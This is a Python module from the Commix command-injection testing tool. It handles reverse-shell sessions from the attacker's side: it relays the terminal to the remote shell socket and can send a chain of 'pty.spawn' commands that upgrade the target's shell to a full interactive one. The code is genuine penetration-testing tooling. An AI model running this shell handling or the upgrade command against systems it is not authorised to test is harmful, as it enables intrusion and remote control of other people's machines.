#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import socket
import select
import threading
from src.core.parse import cmdline as menu
from src.utils import common
from src.utils import settings

# How long the built-in reverse handler waits for the callback before giving up.
ACCEPT_TIMEOUT = 15

# Ctrl-] (0x1D) - telnet's own escape byte, chosen for the same reason: raw mode forwards Ctrl-C
# to the remote shell instead of stopping anything here, so detaching needs a byte of its own.
PTY_ESCAPE_BYTE = b"\x1d"

"""
The command that upgrades a plain Unix shell into a real PTY - tried shell by shell until one of
them is there, 'bash' first for the shell it gives, then 'sh' for a target without it; 'python3'
first since Python 2 is long past end-of-life, then 'python' for a target only answering to that.
"""
def pty_upgrade_cmd():
  attempts = []
  for py in ("python3", "python"):
    for shell in ("/bin/bash", "/bin/sh"):
      attempts.append(py + " -c \"import pty; pty.spawn('" + shell + "')\" 2>/dev/null")
  return " || ".join(attempts) + "\n"

"""
Put the local terminal into raw mode (every keystroke forwarded as-is, no local echo, no
line-buffering, Ctrl-C included) and hand back what it takes to put it back the way it was -
None where there is nothing to raw-mode at all (no real terminal, or none of this attacker host's
own doing, i.e. Windows, which has no 'termios'/'tty' to begin with).
"""
def enter_raw_mode():
  if settings.IS_WINDOWS or not sys.stdin.isatty():
    return None
  try:
    import tty
    import termios
  except ImportError:
    return None
  fd = sys.stdin.fileno()
  saved = termios.tcgetattr(fd)
  tty.setraw(fd)
  return saved

"""
Undo 'enter_raw_mode()', a no-op where it returned nothing to undo.
"""
def restore_terminal(saved):
  if saved is None:
    return
  import termios
  termios.tcsetattr(sys.stdin.fileno(), termios.TCSADRAIN, saved)

"""
Bridge local stdin/stdout to a connected shell socket byte-for-byte, once it has been upgraded to
a real PTY - raw, not line-buffered, so the remote shell's own echo, job control, line editing and
full-screen programs (vim, less, top) all work as they would over a direct connection. Ctrl-] (not
Ctrl-C, which the remote shell owns now) ends the session cleanly from this end - there being
nothing to detach to, the one socket this plain shell runs over, closing it ends it either way.
"""
def _raw_relay(sock):
  info_msg = "Upgraded to a full PTY ('--pty'). Ctrl-] ends the session and returns here."
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  stdin_fd = sys.stdin.fileno()
  saved = enter_raw_mode()
  try:
    sock.sendall(pty_upgrade_cmd().encode(settings.DEFAULT_CODEC, "replace"))
    while True:
      readable, _, _ = select.select([stdin_fd, sock], [], [])
      if sock in readable:
        data = sock.recv(4096)
        if not data:
          break
        os.write(1, data)
      if stdin_fd in readable:
        data = os.read(stdin_fd, 4096)
        if not data:
          break
        if PTY_ESCAPE_BYTE in data:
          break
        sock.sendall(data)
  except (OSError, socket.error):
    pass
  finally:
    restore_terminal(saved)

"""
Runs execute_cmd(cmd) on a background thread so the main thread stays free to accept() the callback.
"""
def run_payload_send(execute_cmd, cmd, result):
  if settings.VERBOSITY_LEVEL == 0:
    threading.current_thread().commix_suppress_output = True
  try:
    result["shell"] = execute_cmd(cmd)
  except (Exception, SystemExit) as err:
    # Output is suppressed on this thread, so hand the reason back for the caller to report.
    result["error"] = err

"""
Bridges local stdin/stdout to a connected shell socket - line-buffered, not raw-TTY, unless
'--pty' asked for the real thing and the target and this attacker host can both do it.
"""
def interactive_relay(sock, filename, url):
  if menu.options.pty:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      warn_msg = "'--pty' needs a Unix-like target to upgrade (no 'pty' module on Windows) - using the standard relay instead."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    elif settings.IS_WINDOWS or not sys.stdin.isatty():
      warn_msg = "'--pty' needs a real POSIX terminal on this end - using the standard relay instead."
      settings.print_data_to_stdout(settings.print_warning_msg(warn_msg))
    else:
      try:
        _raw_relay(sock)
      finally:
        try:
          sock.shutdown(socket.SHUT_RDWR)
        except Exception:
          pass
        try:
          sock.close()
        except Exception:
          pass
      return

  remote_closed = threading.Event()

  # Carry whatever the socket says back to the terminal, until it says nothing more.
  def _reader():
    try:
      while True:
        data = sock.recv(4096)
        if not data:
          break
        with settings.PRINT_LOCK:
          settings._stdout_write(data.decode(settings.DEFAULT_CODEC, errors="replace"))
          sys.stdout.flush()
    except Exception:
      pass
    finally:
      remote_closed.set()

  threading.Thread(target=_reader, daemon=True).start()

  try:
    while not remote_closed.is_set():
      try:
        line = common.safe_input("")
      except KeyboardInterrupt:
        from src.core.controller import shell_options
        shell_options.back_or_quit_prompt("Session interrupted (Ctrl-C pressed). [(b)ack/(q)uit] ", filename, url)
        break
      except EOFError:
        break
      if remote_closed.is_set():
        settings.print_data_to_stdout(settings.print_info_msg("Session closed by the remote host."))
        break
      try:
        sock.sendall((line + "\n").encode(settings.DEFAULT_CODEC, "replace"))
      except (OSError, socket.error):
        settings.print_data_to_stdout(settings.print_info_msg("Session closed by the remote host."))
        break
  finally:
    # shutdown() before close() forces the EOF that makes the remote shell exit.
    try:
      sock.shutdown(socket.SHUT_RDWR)
    except Exception:
      pass
    try:
      sock.close()
    except Exception:
      pass

# eof
